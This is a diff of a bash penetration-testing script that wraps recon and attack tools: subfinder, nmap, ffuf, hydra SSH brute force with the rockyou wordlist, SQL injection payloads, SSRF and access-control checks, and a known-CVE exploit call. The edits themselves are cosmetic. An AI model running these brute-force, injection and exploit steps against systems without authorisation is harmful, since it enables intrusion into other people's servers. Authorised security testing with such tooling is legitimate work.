@@ -68,7 +68,7 @@ usage() {
     exit 1
 }
 
-# ======= OPTIONAL SAVE FUNCTIONALITY =======
+# ======= OPTIONAL SAVE =======
 save_output() {
     local data="$1"
     local filename="$2"
@@ -84,35 +84,42 @@ crawl_html() {
     curl -s "$TARGET" | grep -E "<!--.*-->" >> "$OUTPUT_DIR/comments.txt"
     echo -e "${GREEN}[+] Crawling results saved to $OUTPUT_DIR/urls.txt and $OUTPUT_DIR/comments.txt${NC}"
 }
+
 # ======= RECONNAISSANCE =======
 recon_module() {
     local domain="$1"
     echo -e "${CYAN}[+] Starting Reconnaissance on $domain...${NC}"
 
+   
     # Subdomain Enumeration
     echo "[*] Enumerating subdomains..."
     subdomains=$(subfinder -d "$domain" && dmitry -i -w -n -s -e -p "$domain" | sort -u)
     echo -e "${GREEN}[+] Subdomains:${NC}\n$subdomains"
     save_output "$subdomains" "subdomains_$domain.txt"
 
+    
     # FinalRecon Integration
     echo "[*] Running FinalRecon..."
-    finalrecon_results=$(finalrecon --url https://"$domain" -w /grep/home/fuzz.txt)
+    finalrecon_results=$(finalrecon --url "https://$domain" -w /grep/home/fuzz.txt)
     echo -e "${GREEN}[+] FinalRecon Results:${NC}\n$finalrecon_results"
     save_output "$finalrecon_results" "finalrecon_$domain.txt"
 
+   
     # Port Scanning
     echo "[*] Scanning ports..."
     nmap_results=$(nmap -sV -O -p- -T4 "$domain")
     echo -e "${GREEN}[+] Nmap Results:${NC}\n$nmap_results"
     save_output "$nmap_results" "nmap_$domain.txt"
 
+   
     # Directory Enumeration
     echo "[*] Fuzzing directories..."
     directories=$(ffuf -w "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" -u "$domain/FUZZ")
     echo -e "${GREEN}[+] Directories:${NC}\n$directories"
     save_output "$directories" "directories_$domain.txt"
-}
+    
+    }
+
 parse_js_files() {
     echo -e "${CYAN}[+] Extracting JavaScript endpoints.${NC}"
     curl -s "$TARGET" | grep -Eo 'src="[^"]+\.js"' | cut -d'"' -f2 > "$OUTPUT_DIR/js_files.txt"
@@ -142,6 +149,7 @@ vulnerability_module() {
     echo -e "${GREEN}[+] XSS Results:${NC}\n$xss_results"
     save_output "$xss_results" "xss_$domain.txt"
 }
+
 vulns_deep_crawl() {
     echo -e "${RED}[+] IMPORTANT!${NC}"
     echo -e "${YELLOW}[+] About to begin ~Deep Crawl~ on $TARGET...5-10 min to complete ${NC}"
@@ -152,11 +160,13 @@ vulns_deep_crawl() {
     echo -e "${GREEN}[+] Potential Vulnerabilities:${NC}\n$vulns"
 
 }
+
 privilege_escalation_test() {
     echo -e "${CYAN}[+] Testing privilege escalation vulnerabilities.${NC}"
     curl -s "$TARGET/admin" | grep -q "403" && echo "Possible admin panel access." >> "$OUTPUT_DIR/escalation.txt"
     echo -e "${GREEN}[+] Privilege escalation test results saved.${NC}"
 }
+
 test_broken_access_control() {
     echo -e "${CYAN}[+] Testing broken access control for: $1${NC}"
     response=$(curl -s "$1?id=1" -w "%{http_code}")
@@ -165,12 +175,14 @@ test_broken_access_control() {
     fi
     echo -e "${GREEN}[+] Broken access control testing completed.${NC}"
 }
+
 brute_force_ssh() {
     WORDLIST="${1:-/usr/share/wordlists/rockyou.txt}"
     echo -e "${CYAN}[+] Brute forcing SSH on: $TARGET${NC}"
     hydra -L "$WORDLIST" -P "$WORDLIST" ssh://"$TARGET" -o "$OUTPUT_DIR/ssh_bruteforce.txt"
     echo -e "${GREEN}[+] SSH brute force results saved to $OUTPUT_DIR/ssh_bruteforce.txt${NC}"
 }
+
 ssrf_check() {
     echo "[*] Testing for SSRF vulnerabilities..."
     while IFS= read -r subdomain; do
@@ -179,7 +191,7 @@ ssrf_check() {
 }
 
 
-# SQL Injection Testing
+# Manual SQL Injection Testing
 sql_injection_test() {
     echo -e "${CYAN}[+] Testing SQL injection vulnerabilities on: $TARGET${NC}"
     PAYLOADS=("' OR '1'='1" "' AND SLEEP(5)--")
@@ -202,6 +214,7 @@ exploit_module() {
     echo -e "${GREEN}[+] Command Injection Results:${NC}\n$cmd_injection_results"
     save_output "$cmd_injection_results" "cmd_injection_$domain.txt"
 }
+
 Exploit_Known_CVEs() {
     echo "[*] Exploiting known CVEs..."
     python3 ./cve_exploit.py "$TARGET" >> "$OUTPUT_DIR/cve_exploits_$TARGET.txt"
